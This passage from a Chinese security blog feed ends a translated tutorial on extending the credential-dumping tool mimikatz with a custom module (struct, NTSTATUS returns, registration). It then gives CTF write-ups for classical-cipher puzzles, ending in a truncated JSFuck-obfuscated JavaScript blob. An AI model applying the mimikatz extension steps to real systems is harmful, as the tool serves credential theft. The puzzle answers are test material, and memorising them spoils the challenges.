plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KUHL_M_C &#123;</span><br><span class="line">    const PKUHL_M_C_FUNC pCommand;</span><br><span class="line">    const wchar_t * command;</span><br><span class="line">    const wchar_t * description;</span><br><span class="line">&#125; KUHL_M_C, *PKUHL_M_C;</span><br></pre></td></tr></table></figure><p>1.<code>pCommand</code>是我们的模块功能<br>2.<code>“command”</code>说我们如何在终端中调用这个模块<br>3.描述是对函数做什么的简要描述<code>NTSTATUS</code>类型在<code>Ntdef.h</code>中定义，系统提供的状态码在<code>Ntstatus.h</code>中定义。<br>NTSTATUS值用于传递系统信息。它们有四种类型：成功值，信息值，警告和错误值</p><p><code>NTSTATUS kuhl_m_modulename_functioname（int argc，wchar_t * argv []）;</code><br>它可以在<code>NTSTATUS</code>中返回它想要的内容，除了：<code>STATUS_FATAL_APP_EXIT</code>，需要退出mimikatz。</p><p><img src="https://p4.ssl.qhimg.com/t0147e02faf651be4b2.jpg" alt=""><br>我们在头文件中做了必要的声明并传递给了主文件。</p><p><img src="https://p0.ssl.qhimg.com/t01004a3292af5c06d6.jpg" alt=""></p><p>我们用<code>kuhl_m_modulename.h＆kuhl_m_modulename.c</code>创建了我们的模块。最后一步我们需要在<code>mimikatz.h</code>中添加模块，然后在<code>mimikatz.c</code>模块列表中添加全局变量。</p><p><img src="https://p4.ssl.qhimg.com/t012677e8bdc2423da8.jpg" alt=""><br><img src="https://p1.ssl.qhimg.com/t01fec0134d3f18ec47.jpg" alt=""></p><p>模块列表</p><p><img src="https://p5.ssl.qhimg.com/t015b205f8c018b119c.jpg" alt=""></p><p>你现在可以建立mimikatz，然后运行它！</p><p>如果你看到下面这个消息，那么你成功了！</p><p><img src="https://p4.ssl.qhimg.com/t01cfdc8c8a6fabf4fc.jpg" alt="">祝你有美好的一天^^</p><p>本文翻译:<a href="https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html" target="_blank" rel="noopener">https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;嗨，大家好 ！我今天要写关于“我怎样才能添加到模块到&lt;code&gt;mimikatz&lt;/code&gt;中？”首先，你必须在github中克隆或&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz.git&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>实验吧wp(持续更新)</title>
    <link href="https://threst.github.io/2018/05/30/%E5%AE%9E%E9%AA%8C%E5%90%A7wp/"/>
    <id>https://threst.github.io/2018/05/30/实验吧wp/</id>
    <published>2018-05-30T14:13:14.000Z</published>
    <updated>2018-06-01T14:29:42.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h3><p>题目： 现有一段经过加密的密文，内容如下：<br>王夫 井工 夫口 由中人 井中 夫夫 由中大。<br>请找出这段密文隐藏的消息明文。</p><p>格式：CTF{ }</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/423/crypto/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/crypto/1.html</a></p><h5 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码:"></a>当铺密码:</h5><p>就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几<br>1     2    3   4    5    6   7   8   9<br>由   中   人 工   大   王 夫 井  羊<br>所以王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125<br>CTF{RM}</p><h3 id="凯撒和某某加密"><a href="#凯撒和某某加密" class="headerlink" title="凯撒和某某加密"></a>凯撒和某某加密</h3><p>题目：aZZg/x\ZbavpZiEZp+n)o+</p><h4 id="writeup："><a href="#writeup：" class="headerlink" title="writeup："></a>writeup：</h4><p>这是整个ascii表的凯撒移动，我参照网上提供一个py代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    s=<span class="string">"aZZg/x\ZbavpZiEZp+n)o+"</span></span><br><span class="line">    <span class="comment">#ascii码表中可打印的字符</span></span><br><span class="line">    a=string.maketrans(<span class="string">''</span>, <span class="string">''</span>)[<span class="number">33</span>:<span class="number">127</span>]</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        b=a[n:]+a[:n]</span><br><span class="line">        table=string.maketrans(a,b)</span><br><span class="line">        <span class="keyword">print</span> string.translate(s,table)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure><blockquote><p>aZZg/x\ZbavpZiEZp+n)o+<br>b[[h0y][cbwq[jF[q,o<em>p,<br>c\i1z^\dcxr\kG\r-p+q-<br>d]]j2{_]edys]lH]s.q,r.<br>e^^k3|<code>^fezt^mI^t/r-s/f__l4}a_gf{u_nJ_u0s.t0g`</code>m5~b<code>hg|v</code>oK`v1t/u1<br>haan6!caih}wapLaw2u0v2<br>ibbo7”dbji~xbqMbx3v1w3<br>jccp8#eckj!ycrNcy4w2x4<br>kddq9$fdlk”zdsOdz5x3y5<br>leer:%geml#{etPe{6y4z6<br>mffs;&amp;hfnm$|fuQf|7z5{7<br>nggt&lt;’igon%}gvRg}8{6|8<br>ohhu=(jhpo&amp;~hwSh~9|7}9<br>piiv&gt;)kiqp’!ixTi!:}8~:<br>qjjw?</em>ljrq(“jyUj”;~9!;<br>rkkx@+mksr)#kzVk#&lt;!:”&lt;<br>sllyA,nlts<em>$l{Wl$=”;#=<br>tmmzB-omut+%m|Xm%&gt;#&lt;$&gt;<br>unn{C.pnvu,&amp;n}Yn&amp;?$=%?<br>voo|D/qowv-‘o~Zo‘@%&gt;&amp;@<br>wpp}E0rpxw.(p![p(A&amp;?’A<br>xqq~F1sqyx/)q”\q)B‘@(B<br>yrr!G2trzy0</em>r#]r<em>C(A)C<br>zss”H3us{z1+s$^s+D)B</em>D<br>ok</p></blockquote><p>注意这一行：f__l4}a_gf{u_nJ_u0s.t0<br>栅栏密码特点就是隔几个字母能读顺成一个单词，一般译为分2个一组<br>具体情况具体分析，就像此题一处特殊单独三个一组。观察敏感得知，<br>反正有奇葩字符肯定不是，看有没有{，}，CTF,flag这种字符得知：<br>f__l4}a_gf{u_nJ_u0s.t0进行解密：</p><blockquote><p>f__    =&gt;f _  _<br>l4}     =&gt;l 4   }<br>a_     =&gt;a _<br>gf      =&gt;g f<br>{u      =&gt;{ u<br><em>n     =&gt;</em> n<br>J_     =&gt;J _<br>u0     =&gt;u 0<br>s.      =&gt;s .<br>t0      =&gt;t 0</p></blockquote><p>结果就是flag{_Just_4_fun_0.0_}</p><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p> 题目：提示：和键盘有关<br>解题链接： <a href="http://ctf5.shiyanbar.com/360/keyboard.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/360/keyboard.html</a></p><h4 id="writeup：-1"><a href="#writeup：-1" class="headerlink" title="writeup："></a>writeup：</h4><p>打开网页后看到：BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN<br>根据题目提示，我发现这些在键盘上排列出一个英文字母..（这些明显是密室逃脱的套路）<br>BHUK,LP对应N，TGBNHGYT对应B，UYGBN对应C</p><p>flag:NBNCBNNBNBC</p><h3 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h3><p>57R9S980RNOS49973S757PQO9S80Q36P （md5不解密）<br>解密<a href="https://www.rot13.com" target="_blank" rel="noopener">网站</a><br>flag:57E9F980EABF49973F757CDB9F80D36C</p><h3 id="他的情书"><a href="#他的情书" class="headerlink" title="他的情书"></a>他的情书</h3><p> 从前从前,有个人爱你很久很久<br>格式：ctf{}<br>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/4" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/4</a><br>f12查看源码</p><pre><code>`[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[